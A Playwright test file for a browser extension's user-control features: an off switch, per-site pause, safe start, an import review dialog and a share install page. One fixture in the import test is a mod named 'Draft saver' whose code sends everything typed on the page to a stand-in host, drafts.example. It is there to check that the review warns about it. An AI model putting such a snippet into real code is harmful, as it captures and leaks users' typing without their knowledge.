// User control in real Chromium: the off switch, "Pause Morse here", safe
// start, the in-app install review, and the share page's plain-language
// summary. The runtime runs on demo/playground.html, whose fake host uses
// the real core/control-host.js and keeps everything in localStorage.
import { test, before, after, afterEach } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { readFile } from "node:fs/promises";
import { bundleRuntime } from "../runtime/bundle.js";
import { createMod, encodeShare } from "../core/mod.js";

let chromium;
try { ({ chromium } = createRequire(import.meta.url)("playwright")); } catch {}
const skip = !chromium && "playwright not installed";
const ROOT = new URL("../", import.meta.url);
const ORIGIN = "http://morse.test";
const TYPES = { html: "text/html", js: "text/javascript", css: "text/css", json: "application/json" };
let browser;

before(async () => { if (!skip) browser = await chromium.launch(); });
after(() => browser?.close());
// A failed test must not leave its page around (it would keep timers and focus).
const contexts = new Set();
afterEach(async () => { for (const c of contexts) await c.close().catch(() => {}); contexts.clear(); });

async function context() {
  const ctx = await browser.newContext({ viewport: { width: 1100, height: 760 } });
  contexts.add(ctx);
  const runtime = bundleRuntime();
  await ctx.route(`${ORIGIN}/**`, async route => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/dist/extension/runtime.js") return route.fulfill({ body: runtime, contentType: TYPES.js });
    try { route.fulfill({ body: await readFile(new URL("." + path, ROOT)), contentType: TYPES[path.split(".").pop()] || "text/plain" }); }
    catch { route.fulfill({ status: 404, body: "" }); }
  });
  return ctx;
}

const now = new Date().toISOString();
const MODS = {
  wide: { morse: 1, id: "wide", title: "Roomy toolbar", prompt: "give the toolbar more room", match: { hosts: ["morse.test"], app: null }, target: null,
    css: "#toolbar { padding: 30px; }", js: "", enabled: true, created: now, updated: now, model: "qwen2.5-coder:7b" },
  hello: { morse: 1, id: "hello", title: "Hello button", prompt: "add a hello button", match: { hosts: ["morse.test"], app: null }, target: null,
    css: "", js: "morse.watch('#toolbar', t => t.append(morse.el('button', { text: 'hello', class: 'hb' })));", enabled: true, created: now, updated: now,
    imported: true, importedFrom: "link", importedAt: now, author: "Ana" },
};

async function playground(ctx, mods = MODS) {
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", e => errors.push(e.message));
  if (process.env.DEBUG_UI) page.on("console", m => console.log("[page]", m.type(), m.text()));
  // Seed the store from a blank page on the same origin, so the playground's
  // first load already has the mods (an extra quick load would count for safe start).
  await page.goto(`${ORIGIN}/blank`);
  await page.evaluate(m => { localStorage.setItem("morse:playground:mods", JSON.stringify(m)); localStorage.setItem("morse:debug", "1"); }, mods);
  await page.goto(`${ORIGIN}/demo/playground.html?light`);
  await page.waitForFunction(() => document.querySelector("[data-morse-ui]")?.dataset.status);
  await page.waitForFunction(() => JSON.parse(document.querySelector("[data-morse-ui]").dataset.status).mods > 0);
  return { page, errors };
}
async function reload(page) {
  await page.reload();
  await page.waitForFunction(() => document.querySelector("[data-morse-ui]")?.dataset.status);
  await page.waitForFunction(() => JSON.parse(document.querySelector("[data-morse-ui]").dataset.status).mods > 0);
}
const sr = sel => `document.querySelector("[data-morse-ui]").shadowRoot.querySelector(${JSON.stringify(sel)})`;
const text = (page, sel) => page.evaluate(`${sr(sel)}?.textContent || ""`);
const click = (page, sel) => page.evaluate(`${sr(sel)}.click()`);
async function until(fn, ms = 8000) {
  const end = Date.now() + ms;
  for (;;) {
    const v = await Promise.resolve().then(fn).catch(() => null);
    if (v) return v;
    if (Date.now() > end) throw new Error("timed out waiting for " + fn);
    await new Promise(r => setTimeout(r, 40));
  }
}
const padding = page => page.evaluate(() => getComputedStyle(document.getElementById("toolbar")).paddingTop);
const helloCount = page => page.locator(".hb").count();
const running = async page => (await padding(page)) === "30px" && (await helloCount(page)) === 1;
const stopped = async page => (await padding(page)) !== "30px" && (await helloCount(page)) === 0;
const stored = page => page.evaluate(() => JSON.parse(localStorage.getItem("morse:playground:mods")));

test("off switch: Alt+Shift+0 turns every mod off at once, the toast turns them back on, and it holds across a reload", { skip }, async () => {
  const ctx = await context();
  const { page, errors } = await playground(ctx);
  await until(() => running(page));
  await page.keyboard.press("Alt+Shift+Digit0");
  await until(() => stopped(page), 3000); // the CSS goes at once; the toast follows once the code is off
  assert.match(await until(() => text(page, ".ctl-toast")), /Turned off 2 mods on this page/);
  assert.equal(await text(page, ".ctl-toast .ctl-acts button"), "Turn back on");
  assert.deepEqual(Object.values(await stored(page)).map(m => m.enabled), [true, true], "nothing is deleted or switched off for good");
  await click(page, ".ctl-toast .ctl-acts button");
  await until(() => running(page));
  // Off again, then reload: still off in this tab, and the panel says so.
  await page.keyboard.press("Alt+Shift+Digit0");
  await until(() => stopped(page));
  await reload(page);
  await page.waitForTimeout(400);
  assert.ok(await stopped(page), "still off after a reload");
  await page.keyboard.press("Alt+Shift+KeyM");
  await until(() => text(page, ".ctl-strip"));
  assert.match(await text(page, ".ctl-strip"), /Mods are turned off on this page/);
  assert.match(await text(page, ".list"), /not running/);
  // The same key turns them back on.
  await page.keyboard.press("Alt+Shift+Digit0");
  await until(() => running(page));
  assert.deepEqual(errors, []);
  await ctx.close();
});

test("the off switch is a setting with a recorder like the other hotkeys", { skip }, async () => {
  const ctx = await context();
  const { page } = await playground(ctx);
  await page.keyboard.press("Alt+Space");
  await page.keyboard.press("Control+Comma");
  await until(() => page.evaluate(`!!${sr('.hk[data-hk="off"]')}`));
  assert.match(await text(page, '.hkrow[data-id="off"]'), /Turn off all mods/);
  await click(page, '.hk[data-hk="off"]');
  await page.keyboard.press("Alt+Shift+Digit9");
  await until(() => page.evaluate(() => JSON.parse(document.querySelector("[data-morse-ui]").dataset.status).hotkeys.off === "Alt+Shift+Digit9"));
  await page.keyboard.press("Escape");
  await page.keyboard.press("Escape");
  await page.keyboard.press("Alt+Shift+Digit9");
  await until(() => stopped(page));
  await ctx.close();
});

test("Pause Morse here: from the Mods panel, kept by the host across reloads", { skip }, async () => {
  const ctx = await context();
  const { page, errors } = await playground(ctx);
  await until(() => running(page));
  await page.keyboard.press("Alt+Shift+KeyM");
  await until(() => page.evaluate(`!!${sr("[data-c=pause-site]")}`));
  assert.match(await text(page, ".ctl-strip"), /Pause Morse on morse\.test/);
  await click(page, "[data-c=pause-site]");
  await until(() => stopped(page));
  assert.match(await until(() => text(page, ".ctl-toast")), /Paused Morse on morse\.test\. Your mods are saved/);
  const control = await page.evaluate(() => JSON.parse(localStorage.getItem("morse:playground:control")));
  assert.ok(control.pause.sites["morse.test"]);
  await reload(page);
  await page.waitForTimeout(400);
  assert.ok(await stopped(page), "paused after a reload");
  await page.keyboard.press("Alt+Shift+KeyM");
  await until(() => page.evaluate(`${sr("[data-c=pause-site]")}?.checked`));
  await click(page, "[data-c=pause-site]");
  await until(() => running(page));
  assert.deepEqual(errors, []);
  await ctx.close();
});

test("where it came from and Show code are on every row; Show code explains before the code", { skip }, async () => {
  const ctx = await context();
  const { page } = await playground(ctx);
  await page.keyboard.press("Alt+Shift+KeyM");
  await until(() => page.evaluate(`${sr(".list")}.querySelectorAll(".ctl-origin").length === 2`));
  const rows = await page.evaluate(`[...${sr(".list")}.querySelectorAll("article")].map(a => a.querySelector(".ctl-origin").textContent)`);
  assert.match(rows[0], /Made here with qwen2\.5-coder:7b/);
  assert.match(rows[1], /Installed from a shared link by Ana/);
  assert.equal(await page.evaluate(`${sr(".list")}.querySelectorAll("article [data-c=show]").length`), 2, "Show code on every row");
  await page.evaluate(`${sr('article[data-id="hello"] [data-c=show]')}.click()`);
  await until(() => text(page, ".modal .ctl-items"));
  assert.match(await text(page, ".modal .ctl-items"), /Adds buttons to the page/);
  assert.match(await text(page, ".modal"), /morse\.watch\('#toolbar'/);
  await ctx.close();
});

test("safe start: a page that keeps reloading within seconds after a mod runs holds it back and asks", { skip }, async () => {
  const ctx = await context();
  const loopy = { ...MODS.hello, id: "loopy", title: "Loopy", imported: false };
  const { page, errors } = await playground(ctx, { loopy });
  await until(() => helloCount(page));
  for (const strike of [1, 2]) {
    await reload(page);
    await until(() => helloCount(page), 8000).catch(() => assert.fail(`ran on load ${strike + 1}`));
  }
  await reload(page); // the third strike: held back on this load
  await until(() => text(page, ".ctl-toast"));
  assert.match(await text(page, ".ctl-toast"), /Safe start “Loopy” is off for now/);
  await page.waitForTimeout(300);
  assert.equal(await helloCount(page), 0, "not run");
  assert.deepEqual([...(await page.evaluate(`[...${sr(".ctl-toast .ctl-acts")}.querySelectorAll("button")].map(b => b.textContent)`))], ["Keep it off", "Turn it back on"]);
  await page.evaluate(`[...${sr(".ctl-toast .ctl-acts")}.querySelectorAll("button")][0].click()`);
  await until(async () => (await stored(page)).loopy.enabled === false);
  await reload(page).catch(() => {}); // no mods enabled now, so don't wait for them
  await page.waitForTimeout(500);
  assert.equal(await helloCount(page), 0);
  assert.deepEqual(errors, []);
  await ctx.close();
});

test("import: the in-app review shows what it does, folds the code, and installs only on Install", { skip }, async () => {
  const ctx = await context();
  const { page, errors } = await playground(ctx);
  const spy = createMod({ title: "Draft saver", prompt: "save my drafts", url: "http://morse.test/", css: "",
    js: "morse.on(document, 'input', e => fetch('https://drafts.example/save', { method: 'POST', body: e.target.value }));" });
  const link = await encodeShare({ ...spy, author: "Sam" });
  await page.keyboard.press("Alt+Shift+KeyM");
  await until(() => page.evaluate(`!!${sr("[data-a=import]")}`));
  await click(page, "[data-a=import]");
  await page.evaluate(`(() => { const t = ${sr("[data-k=src]")}; t.value = ${JSON.stringify(link)}; })()`);
  await click(page, "[data-a=go]");
  await until(() => text(page, ".modal .ctl-items"));
  const items = await page.evaluate(`[...${sr(".modal .ctl-items")}.querySelectorAll("li")].map(l => l.dataset.s)`);
  assert.deepEqual(items, ["typing", "network", "code"]);
  assert.match(await text(page, ".modal"), /Install “Draft saver”\?/);
  assert.match(await text(page, ".modal"), /made by Sam/);
  assert.match(await text(page, '.modal .ctl-warn[data-s="network"]'), /send information from this page to another website/);
  assert.match(await text(page, '.modal .ctl-warn[data-s="typing"]'), /read what you type/);
  assert.equal(await page.evaluate(`${sr(".modal details.ctl-code")}.open`), false, "code is folded");
  assert.equal(await page.evaluate(`document.querySelector("[data-morse-ui]").shadowRoot.activeElement?.textContent`), "Cancel", "focus starts on Cancel, never on Install");
  assert.equal(Object.keys(await stored(page)).length, 2, "nothing installed yet");
  await click(page, ".modal [data-c=install]");
  await until(async () => Object.keys(await stored(page)).length === 3);
  const m = (await stored(page))[spy.id];
  assert.equal(m.imported, true);
  assert.equal(m.importedFrom, "link");
  assert.equal(m.author, "Sam");
  // Cancel installs nothing.
  await click(page, "[data-a=import]");
  await page.evaluate(`(() => { const t = ${sr("[data-k=src]")}; t.value = ${JSON.stringify(JSON.stringify(createMod({ title: "Other", prompt: "x", css: "a{}", url: "http://morse.test/" })))}; })()`);
  await click(page, "[data-a=go]");
  await until(() => text(page, ".modal .ctl-items"));
  await click(page, ".modal footer [data-a=close]");
  await page.waitForTimeout(200);
  assert.equal(Object.keys(await stored(page)).length, 3);
  assert.deepEqual(errors, []);
  await ctx.close();
});

test("share page: plain-language summary first, code folded below, an explicit Install", { skip }, async () => {
  const ctx = await context();
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", e => errors.push(e.message));
  const mod = createMod({ title: "Word count", prompt: "show a live word count under the message box", url: "https://chat.example/",
    css: ".wc { opacity: .7 }",
    js: "morse.watch('textarea', t => { const c = morse.el('div', { class: 'wc' }); t.after(c); morse.on(t, 'input', () => c.textContent = t.value.split(/\\s+/).length + ' words'); });" });
  const link = await encodeShare(mod);
  await page.goto(`${ORIGIN}/share/install.html#m=${link.split("#m=")[1]}`);
  await page.waitForSelector("ul.items li");
  assert.equal(await page.locator("h1").textContent(), "Word count");
  assert.deepEqual(await page.locator("ul.items li").evaluateAll(l => l.map(e => e.dataset.s)), ["looks", "text", "adds", "typing", "ongoing", "code"]);
  assert.match(await page.locator("ul.items").textContent(), /Reads what you type in this page/);
  assert.match(await page.locator('.note[data-s="typing"]').textContent(), /can read what you type/);
  assert.equal(await page.locator("details#code").evaluate(d => d.open), false);
  assert.equal(await page.locator("#install").textContent(), "Install");
  // Nothing happens without the click; with the extension the click hands off to Morse's own review.
  const posted = [];
  await page.exposeFunction("__posted", d => posted.push(d));
  await page.evaluate(() => { document.documentElement.dataset.morseExtension = "1"; addEventListener("message", e => e.data?.morseInstall && __posted(e.data.morseInstall)); });
  await page.waitForTimeout(100);
  assert.equal(posted.length, 0);
  await page.locator("#install").click();
  await until(() => posted.length === 1);
  assert.match(await page.locator("#status").textContent(), /Press Install there/);
  // Colors come from the design tokens, not literals.
  assert.equal(await page.evaluate(() => getComputedStyle(document.body).backgroundColor), "rgb(251, 251, 251)");
  assert.deepEqual(errors, []);
  await ctx.close();
});
